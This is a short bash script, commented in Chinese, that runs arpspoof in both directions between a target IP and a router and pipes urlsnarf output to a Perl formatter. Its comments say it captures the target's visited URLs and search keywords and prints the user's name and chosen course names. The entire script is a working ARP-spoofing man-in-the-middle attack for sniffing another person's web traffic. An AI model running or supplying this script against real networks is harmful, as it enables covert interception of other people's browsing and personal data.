#! /bin/bash
# 作用: 对指定ip的http包进行截获, 进而获取访问的url路径和百搜索关键词
# 参数: sudo course.sh [interface] [dst_ip] [route_ip]
# 输出: 第一行输出用户姓名, 其余行输出所选的课程名

if [ $# -ne 3 ]; then
	exit 1;
fi

arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
# 将urlsnarf的输出交由fmt.pl脚本处理
urlsnarf -i $1 -v "." "host $2" | perl fmt.pl;
